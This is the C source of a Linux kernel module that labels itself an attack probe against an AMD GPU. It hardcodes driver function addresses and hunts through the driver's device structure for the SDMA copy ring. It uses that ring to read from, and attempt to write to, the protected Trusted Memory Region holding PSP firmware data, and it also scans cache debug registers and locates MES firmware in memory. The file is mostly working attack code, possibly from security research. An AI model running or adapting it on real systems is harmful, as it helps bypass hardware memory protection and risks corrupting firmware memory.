/*
 * deep_novel.c — Multi-vector novel attack probe
 *
 * Vector A: SDMA copy via adev->mman.buffer_funcs_ring
 * Vector B: User VMID PTE remap for HIP kernel TMR read
 * Vector C: Display controller TMR readback via scanout address
 * Vector D: Direct GPU register-based VRAM read (bypass DF via GPU MMIO)
 * Vector E: MES data BO location + corruption probe
 * Vector F: PSP SRAM leak via exception/fault injection
 */
#include <linux/module.h>
#include <linux/pci.h>
#include <linux/delay.h>
#include <linux/slab.h>
MODULE_LICENSE("GPL");

typedef u32 (*rreg_fn)(void*, u32);
typedef void (*wreg_fn)(void*, u32, u32);
typedef int (*copy_fn)(void *ring, u64 src, u64 dst, u32 count,
                       void *resv, void **fence, int direct, int flush, int tmz);

static int __init dn_init(void) {
    struct pci_dev *p = pci_get_device(0x1002,0x1586,NULL);
    void *a, *psp;
    rreg_fn rr;
    wreg_fn wr;
    copy_fn copy_buf;
    u64 tmr_mc = 0x97E0000000ULL;
    u64 fw_pri_mc, fence_mc;
    void *fw_pri;

    if (!p) return -ENODEV;
    a=(u8*)pci_get_drvdata(p)-0x10;
    psp=(u8*)a+0x3B910;
    rr=(rreg_fn)0xFFFFFFFFC0E28460ULL;
    wr=(wreg_fn)0xFFFFFFFFC0E28820ULL;
    copy_buf=(copy_fn)0xFFFFFFFFC0E4A570ULL;
    fw_pri=(void*)*(u64*)((u8*)psp+0x058);
    fw_pri_mc=*(u64*)((u8*)psp+0x050);
    fence_mc=*(u64*)((u8*)psp+0x1B8);

    pr_info("dn: === DEEP NOVEL ATTACK PROBE ===\n");

    /* ============================================
     * VECTOR A: SDMA COPY via buffer_funcs_ring
     * ============================================
     * adev->mman.buffer_funcs_ring is a pointer to the SDMA ring
     * used for TTM buffer copies. Find it in adev. */
    pr_info("dn: --- VECTOR A: SDMA COPY ---\n");
    {
        /* adev->mman is struct amdgpu_mman. It contains:
         *   buffer_funcs (ptr to ops)
         *   buffer_funcs_ring (ptr to amdgpu_ring)
         * These are near the TTM device manager in adev.
         * Search for function pointer followed by ring pointer. */
        int off;
        void *sdma_ring = NULL;
        for (off = 0; off < 0x40000; off += 8) {
            u64 v = *(u64*)((u8*)a + off);
            /* buffer_funcs is a const ops struct pointer (kernel text) */
            if (v >= 0xFFFFFFFFC0000000ULL && v < 0xFFFFFFFFD0000000ULL) {
                u64 next = *(u64*)((u8*)a + off + 8);
                /* buffer_funcs_ring should be a kernel heap pointer */
                if ((next >> 48) == 0xFFFF && next != 0xFFFFFFFFFFFFFFFFULL &&
                    next > (u64)(unsigned long)a &&
                    next < (u64)(unsigned long)a + 0x200000) {
                    /* Verify: the ring should have a gpu_addr in GART range */
                    u64 maybe_gpu;
                    int j;
                    int found_gpu = 0;
                    for (j = 0; j < 0x200; j += 8) {
                        copy_from_kernel_nofault(&maybe_gpu,
                            (void*)(unsigned long)(next + j), 8);
                        if (maybe_gpu >= 0x7FFF00000000ULL &&
                            maybe_gpu < 0x7FFF01000000ULL) {
                            found_gpu = 1;
                            break;
                        }
                    }
                    if (found_gpu) {
                        sdma_ring = (void*)(unsigned long)next;
                        pr_info("dn: buffer_funcs_ring at adev+0x%X → %px (gpu=0x%llX at +0x%X)\n",
                            off+8, sdma_ring, maybe_gpu, j);
                        break;
                    }
                }
            }
        }

        if (sdma_ring) {
            void *fence = NULL;
            int ret;

            /* Fill fw_pri with marker */
            { u32 marker = 0xAAAAAAAA; int i;
              for (i = 0; i < 64; i++)
                copy_to_kernel_nofault((u8*)fw_pri + i*4, &marker, 4); }

            pr_info("dn: Calling amdgpu_copy_buffer(ring=%px, src=TMR 0x%llX, dst=fw_pri 0x%llX, 256)...\n",
                sdma_ring, tmr_mc, fw_pri_mc);

            ret = copy_buf(sdma_ring, tmr_mc, fw_pri_mc, 256,
                           NULL, &fence, 1, 0, 0);
            pr_info("dn: copy_buffer ret=%d fence=%px\n", ret, fence);

            if (ret == 0) {
                mdelay(200);
                /* Check if SDMA wrote TMR data to fw_pri */
                { u32 d[8]; int i;
                  for (i = 0; i < 8; i++)
                    copy_from_kernel_nofault(&d[i], (u8*)fw_pri+i*4, 4);
                  pr_info("dn: fw_pri after SDMA: %08X %08X %08X %08X %08X %08X %08X %08X\n",
                      d[0],d[1],d[2],d[3],d[4],d[5],d[6],d[7]);
                  if (d[0] != 0xAAAAAAAA) {
                    pr_info("dn: *** SDMA COPIED DATA FROM TMR! ***\n");
                    if (d[0] != 0xFFFFFFFF && d[0] != 0)
                        pr_info("dn: *** TMR CONTENT (possibly encrypted): ***\n");
                    else if (d[0] == 0xFFFFFFFF)
                        pr_info("dn: SDMA also gets 0xFF — DF blocks GPU DMA too\n");
                    else
                        pr_info("dn: SDMA got zeros — TMR scrubbed or inaccessible\n");
                  } else {
                    pr_info("dn: fw_pri unchanged — SDMA copy failed or pending\n");
                  }
                }
            }

            /* Now try the REVERSE: SDMA write TO TMR */
            if (ret == 0) {
                /* Write known pattern to fw_pri first */
                { u32 pat = 0xDEADC0DE; int i;
                  for (i = 0; i < 64; i++)
                    copy_to_kernel_nofault((u8*)fw_pri + i*4, &pat, 4); }

                pr_info("dn: SDMA copy fw_pri → TMR (write test)...\n");
                fence = NULL;
                ret = copy_buf(sdma_ring, fw_pri_mc, tmr_mc, 256,
                               NULL, &fence, 1, 0, 0);
                pr_info("dn: write ret=%d\n", ret);
            }
        } else {
            pr_info("dn: buffer_funcs_ring not found\n");
        }
    }

    /* ============================================
     * VECTOR D: GPU register-based VRAM read
     * ============================================
     * Instead of CPU MM_INDEX, use GPU's OWN register interface
     * to read VRAM. Some GFX registers can read arbitrary VRAM
     * addresses as part of their function (e.g., debug registers,
     * scratch registers that auto-read from addresses). */
    pr_info("dn: --- VECTOR D: GPU REGISTER VRAM READ ---\n");
    {
        u32 gc = 0x2800;
        /* CP_COHER_BASE/SIZE registers can be used to set up
         * a coherence range. Reading the status might leak data.
         *
         * But more interesting: the GPU's L2 cache can be probed.
         * GL2C (Global L2 Cache) has debug registers that might
         * allow reading cached TMR content.
         *
         * On GFX12, GL2C registers are at specific offsets.
         * Let me probe for non-zero GL2 registers. */

        /* GL2C debug/status registers (scan a range) */
        { int r;
          pr_info("dn: Scanning GL2C range (gc+0x4E00-0x4F00)...\n");
          for (r = 0x4E00; r < 0x4F00; r++) {
            u32 v = rr(a, gc + r);
            if (v != 0 && v != 0xFFFFFFFF)
                pr_info("dn:   [gc+0x%04X] = 0x%08X\n", r, v);
          }
        }

        /* Also: CB (Color Buffer) debug registers might allow
         * setting up a "render target" at TMR address */

        /* EA (Efficiency Arbiter) / UTCL2 registers */
        { int r;
          pr_info("dn: Scanning EA/UTCL2 (gc+0x5000-0x5100)...\n");
          for (r = 0x5000; r < 0x5100; r++) {
            u32 v = rr(a, gc + r);
            if (v != 0 && v != 0xFFFFFFFF)
                pr_info("dn:   [gc+0x%04X] = 0x%08X\n", r, v);
          }
        }
    }

    /* ============================================
     * VECTOR E: MES DATA BO deep scan
     * ============================================
     * Scan beyond 2MB for MES data buffers */
    pr_info("dn: --- VECTOR E: MES DATA BO DEEP SCAN ---\n");
    {
        /* MES data size = GFX_MES_DRAM_SIZE (typically 64KB-256KB per pipe)
         * Search for 0x10000 (64KB) or 0x40000 (256KB) as a BO size,
         * followed by VRAM address and CPU pointer. */
        int off;
        int found = 0;

        /* Search for struct firmware * to MES blobs
         * MES fw sizes: 643536 (0x9D1D0) and 611920 (0x95650) */
        for (off = 0; off < 0x400000 && found < 3; off += 8) {
            u64 val = *(u64*)((u8*)a + off);
            /* Search for firmware struct (size field = known MES sizes) */
            if (val == 643536 || val == 611920) {
                u64 data_ptr = *(u64*)((u8*)a + off + 8);
                if ((data_ptr >> 48) == 0xFFFF) {
                    u32 hdr;
                    copy_from_kernel_nofault(&hdr,
                        (void*)(unsigned long)data_ptr, 4);
                    pr_info("dn: MES fw struct at adev+0x%X: size=%llu data=%px hdr=0x%08X\n",
                        off, val, (void*)(unsigned long)data_ptr, hdr);
                    found++;

                    /* The data section is typically after the ucode section in the blob.
                     * For MES: data_offset = header[9] or header[10]
                     * Let me read the header to find data section */
                    {
                        u32 h[12]; int j;
                        for (j = 0; j < 12; j++)
                            copy_from_kernel_nofault(&h[j],
                                (void*)(unsigned long)(data_ptr + j*4), 4);
                        pr_info("dn:   hdr[0-11]: ");
                        for (j = 0; j < 12; j++) pr_cont("%08X ", h[j]);
                        pr_cont("\n");

                        /* mes_firmware_header_v1_0 after common_firmware_header(7 DW):
                         * [7] mes_ucode_version
                         * [8] mes_ucode_size_bytes
                         * [9] mes_ucode_offset_bytes
                         * [10] mes_ucode_data_version
                         * [11] mes_ucode_data_size_bytes
                         * Actually the struct has:
                         *   common_firmware_header (7 DW = 28 bytes)
                         *   mes_ucode_version (4)
                         *   mes_ucode_size_bytes (4)
                         *   mes_ucode_offset_bytes (4)
                         *   mes_ucode_data_version (4)
                         *   mes_ucode_data_size_bytes (4)
                         *   mes_ucode_data_offset_bytes (4)
                         * Wait, common_firmware_header is variable (header_size_dw field).
                         * h[1] = header_size_dw. For MES it was 0x48 = 72 DWORDs = 288 bytes.
                         * That's WAY more than 7 DWORDs. Let me read at offset 288. */
                        if (h[1] > 0 && h[1] < 0x100) {
                            u32 hdr_bytes = h[1] * 4;
                            /* MES-specific fields start after common header */
                            /* But actually, for mes_firmware_header_v1_0:
                             * The common header has ucode_offset at h[6].
                             * The MES-specific data offset follows. */
                            pr_info("dn:   header_size=%u bytes, ucode_off=0x%X, ucode_size=0x%X\n",
                                hdr_bytes, h[6], h[5]);
                            /* MES data section: look for data_offset in extended header */
                            { u32 eh[4];
                              copy_from_kernel_nofault(eh,
                                  (void*)(unsigned long)(data_ptr + 7*4), 16);
                              pr_info("dn:   ext[0-3] (after common): %08X %08X %08X %08X\n",
                                  eh[0], eh[1], eh[2], eh[3]);
                            }
                        }
                    }
                }
            }
        }
    }

    pci_dev_put(p);
    return 0;
}
static void __exit dn_exit(void) { pr_info("dn: unloaded\n"); }
module_init(dn_init); module_exit(dn_exit);
